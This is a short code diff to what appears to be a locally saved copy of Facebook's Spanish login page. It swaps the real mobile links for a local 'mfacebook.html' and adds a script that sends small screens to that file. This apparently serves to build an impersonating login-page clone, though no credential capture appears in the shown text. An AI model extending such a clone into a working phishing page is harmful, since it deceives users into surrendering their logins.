@@ -3,6 +3,7 @@
 
 <head>
     <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
     <script nonce="sqB6u7SD">
         function envFlush(a) {
@@ -48,8 +49,8 @@
     <meta property="og:url" content="https://www.facebook.com/" />
     <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
     <meta property="og:locale" content="es_ES" />
-    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
-    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
+    <link rel="alternate" media="only screen and (max-width: 640px)" href="mfacebook.html" />
+    <link rel="alternate" media="handheld" href="mfacebook.html" />
     <meta name="description"
         content="Inicia sesi&#xf3;n en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces." />
     <link rel="canonical" href="https://www.facebook.com/" />
@@ -3107,6 +3108,11 @@
             });
         }));
     </script>
+    <script>
+        if (screen.width<768) {
+          window.location="mfacebook.html"  
+        }
+    </script>    
 </body>
 
 </html>
